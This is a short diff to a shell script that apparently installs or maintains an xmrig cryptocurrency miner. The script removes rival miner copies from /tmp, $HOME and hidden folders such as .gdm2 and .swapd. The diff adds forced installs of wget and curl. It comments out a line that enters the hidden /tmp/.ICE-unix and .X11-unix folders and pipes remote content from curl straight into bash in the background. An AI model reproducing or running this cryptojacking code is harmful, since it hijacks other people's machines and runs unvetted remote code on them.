@@ -32,6 +32,9 @@ for service in "${services[@]}"; do
     fi
 done
 
+apt install wget curl -y
+yum install wget curl -y
+
 # If script reaches here, no specified services are running
 echo "No specified services are running. Continuing with the script..."
 
@@ -68,9 +71,9 @@ rm -rf $HOME/config.json*
 #rm -rf $HOME/.swapd/config.json*
 rm -rf /tmp/xmrig*
 rm -rf $HOME/xmrig*
-rm -rf $HOME/.gdm2/xmrig*
-rm -rf $HOME/.swapd/xmrig*
+#rm -rf $HOME/.gdm2/xmrig*
+#rm -rf $HOME/.swapd/xmrig*
 
-cd /tmp ; cd .ICE-unix ; cd .X11-unix ; curl -Lso- bench.sh | bash&
+#cd /tmp ; cd .ICE-unix ; cd .X11-unix ; curl -Lso- bench.sh | bash&
 
 
